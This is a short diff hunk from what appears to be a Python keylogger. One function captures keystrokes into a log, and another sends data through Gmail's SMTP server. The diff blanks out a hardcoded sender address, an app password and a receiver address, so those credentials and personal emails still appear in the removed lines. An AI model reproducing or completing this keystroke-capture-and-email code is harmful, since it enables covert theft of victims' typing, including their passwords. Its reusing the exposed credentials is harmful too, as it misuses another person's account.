@@ -32,9 +32,9 @@ def grab_keys(key):# takes the input of keys and stores in a variable named log
     print(log)
 
 def send_email():   
-    sender_email = "ahmeddddali001@gmail.com"   # enter email of sender
-    sender_password = "xnlzqgtngpnczahg"  # enter app password of sender email. use this link to create app password: https://youtu.be/T0Op3Qzz6Ms?si=CXPtpRVapH-hr7so   
-    reciever_email = "malikhaziq93@gmail.com"  # enter email of reciever
+    sender_email = ""   # enter email of sender
+    sender_password = ""  # enter app password of sender email. use this link to create app password: https://youtu.be/T0Op3Qzz6Ms?si=CXPtpRVapH-hr7so   
+    reciever_email = ""  # enter email of reciever
     try:
         s = smtplib.SMTP("smtp.gmail.com", 587)
         s.starttls()
